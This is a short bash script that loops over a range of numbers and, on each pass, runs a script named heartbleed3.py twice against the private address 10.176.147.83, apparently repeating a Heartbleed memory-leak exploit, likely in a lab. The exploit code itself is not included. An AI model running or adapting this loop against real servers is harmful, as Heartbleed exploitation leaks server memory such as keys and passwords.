#!/bin/bash


for i in $(eval echo {$1..$2})
do
python heartbleed3.py 10.176.147.83
python heartbleed3.py 10.176.147.83

sleep 1




sleep 2
done
